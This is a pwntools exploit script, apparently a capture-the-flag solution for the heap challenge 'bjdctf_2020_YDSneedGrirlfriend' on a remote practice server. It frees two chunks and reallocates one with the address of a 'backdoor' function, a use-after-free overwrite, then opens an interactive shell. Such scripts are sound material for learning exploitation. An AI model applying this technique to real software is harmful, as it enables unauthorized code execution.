#!/usr/bin/env python
# coding=utf-8
from pwn import *
context.arch = 'amd64'


local = 0
if local == 1:
    r=process('./bjdctf_2020_YDSneedGrirlfriend')
    gdb.attach(r,"b * menu")
else:
    r = remote('node4.buuoj.cn',28815)

elf= ELF('./bjdctf_2020_YDSneedGrirlfriend')

def add(size,content):
    r.recvuntil('choice :')
    r.sendline('1')
    r.recvuntil('size is :')
    r.sendline(str(size))
    r.recvuntil('name is :')
    r.send(content)

def dele(index):
    r.recvuntil('choice :')
    r.sendline('2')
    r.recvuntil('Index :')
    r.sendline(str(index))

def show(index):
    r.recvuntil('choice>')
    r.sendline('3')
    r.recvuntil('Index :')
    r.sendline(str(index))

add(0x68,'a'*8)
add(0x68,'b'*8)
dele(0)
dele(1)

add(0x18,p64(elf.symbols['backdoor']))

r.interactive()
#0x7fe5e682d620
